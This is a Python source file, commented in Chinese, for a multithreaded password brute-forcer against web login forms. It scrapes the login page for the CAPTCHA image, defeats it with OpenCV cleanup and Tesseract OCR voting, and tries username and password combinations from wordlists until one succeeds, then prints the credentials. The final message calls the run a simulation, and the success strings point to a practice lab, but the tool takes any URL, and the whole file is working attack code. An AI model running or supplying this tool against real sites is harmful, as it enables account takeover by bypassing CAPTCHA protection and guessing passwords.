import argparse
import os
import re
import time
import threading
import subprocess
from collections import Counter
from urllib.parse import urljoin
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests
import numpy as np
from PIL import Image
import pytesseract
import cv2 as cv

#颜色
C_RST = '\033[0m'; C_RED = '\033[91m'; C_GRN = '\033[92m'; C_YEL = '\033[93m'; C_BLU = '\033[94m'

#Tesseract 路径
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
TESS_EXE = os.path.join(BASE_DIR, "Tesseract-OCR", "tesseract.exe")
TESSDATA_DIR = os.path.join(BASE_DIR, "Tesseract-OCR", "tessdata")

# 全局状态
found_credentials = None
stop_event = threading.Event()

def safe_snippet(s, n=120):
    try:
        return (s or '')[:n].replace('\n', ' ').replace('\r', ' ')
    except Exception:
        return ''

def detect_tesseract_version(exe_path):
    exe = exe_path
    try:
        out = subprocess.check_output([exe, '--version'], stderr=subprocess.STDOUT, universal_newlines=True, timeout=5)
        m = re.search(r'tesseract(?:\s+v?)\s*([0-9]+)\.([0-9]+)\.([0-9]+)?', out, re.IGNORECASE)
        if not m:
            return None, out.strip()
        major = int(m.group(1)); minor = int(m.group(2)); patch = int(m.group(3) or 0)
        return (major, minor, patch), out.strip()
    except Exception as e:
        return None, f"{type(e).__name__}: {e}"

# ---------- 基础工具 ----------
def load_lines(path):
    with open(path, 'r', encoding='utf-8') as f:
        return [x.strip() for x in f if x.strip()]

def base_url_of(url):
    return url if url.endswith('/') else url.rsplit('/', 1)[0] + '/'

def find_captcha_candidates(html, base):
    cands = []
    for m in re.finditer(r'<img[^>]+src=["\']([^"\']*captcha[^"\']*)["\']', html, re.IGNORECASE):
        cands.append(urljoin(base, m.group(1)))
    for m in re.finditer(r'["\']([^"\']*captcha\.php[^"\']*)["\']', html, re.IGNORECASE):
        cands.append(urljoin(base, m.group(1)))
    for m in re.finditer(r'<img[^>]+src=["\']([^"\']*(verify|code)[^"\']*)["\']', html, re.IGNORECASE):
        cands.append(urljoin(base, m.group(1)))
    cands.append(urljoin(base, "captcha.php"))
    seen=set(); out=[]
    for u in cands:
        if u not in seen:
            out.append(u); seen.add(u)
    return out

# ---------- 影像预处理 ----------
def to_bgr(img_bytes):
    arr = np.frombuffer(img_bytes, np.uint8)
    return cv.imdecode(arr, cv.IMREAD_COLOR)

def best_channel(bgr):
    b,g,r = cv.split(bgr)
    hsv = cv.cvtColor(bgr, cv.COLOR_BGR2HSV); h,s,v = cv.split(hsv)
    candidates = [b,g,r,s,v]
    best_img, best_score = None, -1
    for ch in candidates:
        lap = cv.Laplacian(ch, cv.CV_64F).var()
        hist = cv.calcHist([ch],[0],None,[256],[0,256]).ravel()
        contrast = (np.argmax(hist) - np.argmin(hist))**2
        score = lap + 0.001*contrast
        if score > best_score:
            best_score, best_img = score, ch
    return best_img

def deskew(gray):
    try:
        thr = cv.threshold(gray, 0, 255, cv.THRESH_BINARY+cv.THRESH_OTSU)[1]
        inv = 255 - thr
        coords = cv.findNonZero(inv)
        if coords is None:
            return gray
        rect = cv.minAreaRect(coords); angle = rect[-1]
        if angle < -45: angle += 90
        if abs(angle) < 0.5 or abs(angle) > 25:
            return gray
        h,w = gray.shape[:2]
        M = cv.getRotationMatrix2D((w//2, h//2), angle, 1.0)
        return cv.warpAffine(gray, M, (w, h), flags=cv.INTER_LINEAR, borderValue=255)
    except Exception:
        return gray

def remove_lines(bw):
    h,w = bw.shape
    hk = cv.getStructuringElement(cv.MORPH_RECT, (max(15,w//20),1))
    vk = cv.getStructuringElement(cv.MORPH_RECT, (1,max(15,h//20)))
    detect_h = cv.morphologyEx(bw, cv.MORPH_OPEN, hk, iterations=1)
    detect_v = cv.morphologyEx(bw, cv.MORPH_OPEN, vk, iterations=1)
    lines = cv.bitwise_or(detect_h, detect_v)
    cleaned = bw.copy()
    cleaned[lines==255] = 255
    return cleaned

def remove_small_components(bw, min_area=30):
    n, labels, stats, _ = cv.connectedComponentsWithStats(255-bw, connectivity=4)
    cleaned = bw.copy()
    for i in range(1,n):
        if stats[i, cv.CC_STAT_AREA] < min_area:
            cleaned[labels==i] = 255
    return cleaned

def build_variants(bgr, level="balanced"):
    gray0 = deskew(best_channel(bgr))

    def clahe(x):
        c = cv.createCLAHE(clipLimit=2.0, tileGridSize=(8,8))
        return c.apply(x)

    def small_rotate(img, angle):
        h, w = img.shape[:2]
        M = cv.getRotationMatrix2D((w//2, h//2), angle, 1.0)
        return cv.warpAffine(img, M, (w, h), flags=cv.INTER_LINEAR, borderValue=255)

    if level == "fast":
        scales = (2.5,)
        angles = (0,)
        thrs   = ("otsu","gauss")
    elif level == "balanced":
        scales = (2.5, 3.0)
        angles = (0, +2, -2)
        thrs   = ("otsu","gauss")
    else:  # max
        scales = (2.0, 2.5, 3.0)
        angles = (0, +2, -2, +4, -4)
        thrs   = ("otsu","gauss","mean")

    variants=[]
    for scale in scales:
        g = cv.resize(gray0, None, fx=scale, fy=scale, interpolation=cv.INTER_LANCZOS4)
        g = cv.medianBlur(g, 3)
        g = cv.bilateralFilter(g, 7, 35, 35)
        g = clahe(g)

        for ang in angles:
            r = small_rotate(g, ang)
            k3 = cv.getStructuringElement(cv.MORPH_RECT, (3,3))
            top = cv.morphologyEx(r, cv.MORPH_TOPHAT, k3)
            bh  = cv.morphologyEx(r, cv.MORPH_BLACKHAT, k3)
            enhanced = cv.add(cv.subtract(top, bh), r)

            mats=[]
            if "otsu" in thrs:
                mats.append(("otsu", cv.threshold(enhanced, 0, 255, cv.THRESH_BINARY+cv.THRESH_OTSU)[1]))
            if "gauss" in thrs:
                mats.append(("gauss", cv.adaptiveThreshold(enhanced,255,cv.ADAPTIVE_THRESH_GAUSSIAN_C,cv.THRESH_BINARY,31,10)))
            if "mean" in thrs:
                mats.append(("mean",  cv.adaptiveThreshold(enhanced,255,cv.ADAPTIVE_THRESH_MEAN_C,    cv.THRESH_BINARY,31,5)))

            for name, bw in mats:
                for inv in (False, True):
                    cur = 255 - bw if inv else bw
                    cur = remove_lines(cur)
                    cur = remove_small_components(cur, min_area=round((cur.shape[0]*cur.shape[1])*0.001)+25)
                    k2 = cv.getStructuringElement(cv.MORPH_RECT, (2,2))
                    cur = cv.morphologyEx(cur, cv.MORPH_CLOSE, k2, iterations=1)
                    cur = cv.morphologyEx(cur, cv.MORPH_OPEN,  k2, iterations=1)

                    tag = f"s{scale}_a{ang}_{name}{'_inv' if inv else ''}"
                    variants.append((tag, cur))
                    bold = cv.dilate(cur, k2, iterations=1)
                    variants.append((tag+"_bold", bold))
    return variants

def split_by_projection(bw):
    img = bw.copy()
    if img.mean() < 128: img = 255 - img
    img = cv.threshold(img, 0, 255, cv.THRESH_BINARY+cv.THRESH_OTSU)[1]
    h,w = img.shape
    col_sum = (255 - img).sum(axis=0)
    gap_thr = max(5, int(0.02*h*255))
    segs=[]; in_char=False; start=0
    for x,s in enumerate(col_sum):
        if not in_char and s>gap_thr:
            in_char=True; start=x
        elif in_char and s<=gap_thr:
            end=x
            if end-start>3: segs.append((start,end))
            in_char=False
    if in_char and w-start>3: segs.append((start,w))
    refined=[]
    for s,e in segs:
        if e-s > h*0.9:
            m=(s+e)//2; refined += [(s,m),(m,e)]
        else:
            refined.append((s,e))
    rois=[]
    for s,e in refined:
        roi = img[:, max(0,s-1):min(w,e+1)]
        rows=(255-roi).sum(axis=1)
        idx=np.where(rows>0)[0]
        if len(idx)==0: continue
        top,bot=max(0,idx[0]-1), min(roi.shape[0], idx[-1]+2)
        roi=roi[top:bot,:]
        target_h=45; scale=target_h/roi.shape[0]
        roi = cv.resize(roi, None, fx=scale, fy=scale, interpolation=cv.INTER_LANCZOS4)
        pad=6
        canvas=np.full((roi.shape[0]+pad*2, roi.shape[1]+pad*2), 255, dtype=np.uint8)
        canvas[pad:pad+roi.shape[0], pad:pad+roi.shape[1]] = roi
        rois.append(canvas)
    return rois

def tesseract_text_and_conf(pil_img, cfg, timeout_sec=1.0, lang='eng'):
    try:
        data = pytesseract.image_to_data(
            pil_img, lang=lang, config=cfg,
            output_type=pytesseract.Output.DICT, timeout=timeout_sec
        )
        texts = [t for t in data['text'] if t.strip()]
        confs = [float(c) for c in data['conf'] if c != '-1']
        text = ''.join(texts).strip()
        text = re.sub(r'[^0-9A-Za-z]', '', text)
        conf = (sum(confs)/len(confs)) if confs else -1.0
        return text, conf
    except pytesseract.TesseractError:
        return "", -1.0
    except Exception:
        try:
            text = pytesseract.image_to_string(pil_img, lang=lang, config=cfg, timeout=timeout_sec)
            text = re.sub(r'[^0-9A-Za-z]', '', text).strip()
            return text, -1.0
        except Exception:
            return "", -1.0

def vote_by_position(cands, target_len):
    pool = [s for s in cands if len(s)==target_len]
    if not pool:
        return ""
    out=[]
    for i in range(target_len):
        cnt = Counter(s[i] for s in pool)
        ch, _ = cnt.most_common(1)[0]
        out.append(ch)
    return ''.join(out)

def recognize_max(img_bytes, len_min=4, len_max=6,
                  tess_exe=None, tessdata=None, attempt_tag="",
                  ocr_level="balanced", ocr_budget=1.5, ocr_timeout=1.0):
    if tess_exe:
        pytesseract.pytesseract.tesseract_cmd = tess_exe
    if tessdata:
        os.environ["TESSDATA_PREFIX"] = os.path.dirname(tessdata)

    whitelist = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"

    def run_pass(pass_tag):
        bgr = to_bgr(img_bytes)
        variants = build_variants(bgr, level=ocr_level)

        if ocr_level == "fast":
            oems=(3,); psms=(7,8)
        elif ocr_level == "balanced":
            oems=(3,1); psms=(7,6,8)
        else:
            oems=(3,1,0); psms=(7,6,8,11,13)

        cfgs=[]
        for oem in oems:
            for psm in psms:
                base = f'--oem {oem} --psm {psm} -c tessedit_char_whitelist={whitelist}'
                if tessdata: base += f' --tessdata-dir "{tessdata}"'
                cfgs.append(base)

        target_len = (len_min + len_max)//2
        start = time.perf_counter()
        texts_all=[]

        for tag, bw in variants:
            pil = Image.fromarray(bw)
            for cfg in cfgs:
                t, _ = tesseract_text_and_conf(pil, cfg, timeout_sec=ocr_timeout)
                if t:
                    texts_all.append(t)
                    if len_min <= len(t) <= len_max:
                        return t
                if (time.perf_counter()-start) > ocr_budget*0.7:
                    break
            if (time.perf_counter()-start) > ocr_budget*0.7:
                break

        for tag, bw in variants[:6]:
            rois = split_by_projection(bw)
            chars=[]
            for r in rois:
                pil = Image.fromarray(r)
                cfg = f'--oem 3 --psm 10 -c tessedit_char_whitelist={whitelist}'
                if tessdata: cfg += f' --tessdata-dir "{tessdata}"'
                t,_ = tesseract_text_and_conf(pil, cfg, timeout_sec=ocr_timeout)
                if t: chars.append(t[0])
                if (time.perf_counter()-start) > ocr_budget: break
            if chars:
                txt = ''.join(chars)
                texts_all.append(txt)
                if len_min <= len(txt) <= len_max:
                    return txt
            if (time.perf_counter()-start) > ocr_budget:
                break

        #投票/回退
        in_range = [t for t in texts_all if len_min <= len(t) <= len_max]
        voted=""
        for L in range(len_min, len_max+1):
            v = vote_by_position(in_range, L)
            if v:
                voted = v; break

        if not voted and texts_all:
            texts_all.sort(key=lambda s: abs(len(s)-target_len))
            voted = texts_all[0][:len_max]
        return voted

    return run_pass("WL")

# ---------- 单次尝试 ----------
def solve_once(session, login_url, username, password, attempt_id, ocr_opts, delay=0.15):
    time.sleep(delay)
    try:
        r = session.get(login_url, timeout=10, allow_redirects=True)
        if r.status_code >= 400:
            return False, r.status_code, "", f"获取登录页失败: {r.status_code}"
    except requests.RequestException as e:
        return False, None, "", f"获取登录页请求异常: {e}"

    base = base_url_of(login_url)
    cands = find_captcha_candidates(r.text, base)
    if not cands:
        return False, r.status_code, "", "未找到验证码URL"

    img_bytes=None; sc=None
    for cu in cands:
        try:
            cr = session.get(cu, timeout=10)
            sc = cr.status_code
            if cr.status_code==200 and cr.headers.get('Content-Type','').startswith('image'):
                img_bytes = cr.content; break
        except requests.RequestException:
            continue
    if img_bytes is None:
        return False, sc or r.status_code, "", "下载验证码失败"

    text = recognize_max(
        img_bytes,
        len_min=ocr_opts.get("len_min", 4),
        len_max=ocr_opts.get("len_max", 6),
        tess_exe=ocr_opts.get("tess_exe"),
        tessdata=ocr_opts.get("tessdata"),
        attempt_tag=f"{attempt_id}_{username}",
        ocr_level=ocr_opts.get("ocr_level", "balanced"),
        ocr_budget=ocr_opts.get("ocr_budget", 1.5),
        ocr_timeout=ocr_opts.get("ocr_timeout", 1.0)
    )

    data = {"username": username, "password": password, "captcha": text}
    try:
        pr = session.post(login_url, data=data, timeout=10)
        code = pr.status_code
    except requests.RequestException as e:
        return False, None, text, f"提交登录异常: {e}"

    body = pr.text
    if "登录成功！" in body:
        return True, code, text, "登录成功！"
    elif "验证码错误" in body:
        return False, code, text, "验证码错误！"
    elif "用户名或密码错误" in body:
        return False, code, text, "用户名或密码错误！"
    else:
        snippet = safe_snippet(body, 100)
        return False, code, text, f"未知响应: {snippet}..."

def worker(task):
    login_url, username, password, attempt_id, opts = task
    try:
        sess = requests.Session()
        if opts.get("no_proxy"):
            sess.trust_env = False
            sess.proxies = {"http": None, "https": None}
        sess.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "keep-alive",
        })

        ok, status, captcha_text, msg = solve_once(
            sess, login_url, username, password, attempt_id,
            ocr_opts={
                "len_min": opts.get("len_min", 4),
                "len_max": opts.get("len_max", 6),
                "tess_exe": opts.get("tess_exe"),
                "tessdata": opts.get("tessdata"),
                "ocr_level": opts.get("ocr_level", "balanced"),
                "ocr_budget": opts.get("ocr_budget", 1.5),
                "ocr_timeout": opts.get("ocr_timeout", 1.0),
            },
            delay=opts.get("delay", 0.15)
        )
        prefix = f"{C_GRN}[+]{C_RST}" if ok else f"{C_RED}[-]{C_RST}"
        status_str = str(status) if status is not None else "N/A"
        print(f"{prefix} 用户名:{username:<15} 密码:{password:<15} 识别验证码为:[{captcha_text}] 状态码:{status_str:<3} {msg}")

        if ok:
            global found_credentials
            if found_credentials is None:
                found_credentials = (username, password)
                stop_event.set()
        return ok

    except Exception as e:
        print(f"{C_RED}[-]{C_RST} 用户名:{username:<15} 密码:{password:<15} 识别验证码为:[ ] 状态码:N/A 线程异常: {type(e).__name__}: {e}")
        return False

def main():
    pytesseract.pytesseract.tesseract_cmd = TESS_EXE
    os.environ["TESSDATA_PREFIX"] = os.path.dirname(TESSDATA_DIR)

    ver_tuple, ver_raw = detect_tesseract_version(TESS_EXE)
    if not ver_tuple:
        print(f"{C_RED}[!] 无法识别 Tesseract 版本。请确认 {TESS_EXE} 存在且可执行。{C_RST}")
        print(f"    返回信息：{ver_raw}")
        return
    if ver_tuple < (4, 0, 0):
        print(f"{C_RED}[!] 检测到 Tesseract 版本为 {ver_tuple}（过旧，需 >= 4.0）。{C_RST}")
        print(f"    当前 --version 输出：\n{ver_raw}")
        return

    p = argparse.ArgumentParser(description="文本验证码识别（限时+分层 + 多配置 + 投票）工具版")
    p.add_argument('-u','--url', required=True)
    p.add_argument('-r','--username')
    p.add_argument('-R','--userlist')
    p.add_argument('-p','--passlist', required=True)
    p.add_argument('-t','--threads', type=int, default=10)
    p.add_argument('--parallel', action='store_true')
    p.add_argument('--no-proxy', action='store_true')
    p.add_argument('--len-min', type=int, default=4)
    p.add_argument('--len-max', type=int, default=4)
    p.add_argument('--delay', type=float, default=0.15)
    p.add_argument('--ocr-level', choices=['fast','balanced','max'], default='balanced')
    p.add_argument('--ocr-budget', type=float, default=1.5, help='单次尝试OCR时间预算(秒)')
    p.add_argument('--ocr-timeout', type=float, default=1.0, help='单次tesseract调用超时(秒)')
    args = p.parse_args()

    if not args.username and not args.userlist:
        p.error("请使用 -r 指定单个用户名或 -R 指定用户名字典")
    if args.username and args.userlist:
        p.error("不能同时使用 -r 和 -R")

    users = [args.username] if args.username else load_lines(args.userlist)
    passes = load_lines(args.passlist)

    print("\n--- 开始暴力破解 ---")
    print(f"目标URL: {args.url}")
    print(f"线程数: {args.threads}")
    print(f"验证码长度: [{args.len_min}-{args.len_max}]")
    print(f"OCR: level={args.ocr_level}, 预算={args.ocr_budget}s, 每次超时={args.ocr_timeout}s")
    print(f"网络: 无代理={args.no_proxy}, delay={args.delay}s")
    print(f"模式: {'平行配对' if args.parallel else '交叉配对'}")

    opts = {
        "no_proxy": args.no_proxy,
        "tess_exe": TESS_EXE,
        "tessdata": TESSDATA_DIR,
        "len_min": args.len_min,
        "len_max": args.len_max,
        "delay": args.delay,
        "ocr_level": args.ocr_level,
        "ocr_budget": args.ocr_budget,
        "ocr_timeout": args.ocr_timeout
    }

    tasks=[]
    attempt_id=0
    if args.parallel and args.userlist:
        n=min(len(users), len(passes))
        for i in range(n):
            tasks.append((args.url, users[i], passes[i], attempt_id, opts)); attempt_id+=1
    else:
        for u in users:
            for pw in passes:
                tasks.append((args.url, u, pw, attempt_id, opts)); attempt_id+=1

    print(f"总计将尝试 {len(tasks)} 次登录组合。\n")

    with ThreadPoolExecutor(max_workers=args.threads) as ex:
        futures=[ex.submit(worker, t) for t in tasks]
        for f in as_completed(futures):
            try:
                f.result()
            except Exception as e:
                print(f"{C_RED}[!] 线程执行异常: {type(e).__name__}: {e}{C_RST}")
            if stop_event.is_set():
                pass

    if found_credentials:
        print(f"\n***** {C_BLU}恭喜！成功找到登录凭据：用户名='{found_credentials[0]}', 密码='{found_credentials[1]}'{C_RST} *****")
    else:
        print(f"\n--- {C_YEL}所有尝试结束，未能找到有效凭据{C_RST} ---")
    print("\n--- 暴力破解模拟结束 ---")

if __name__ == '__main__':
    main()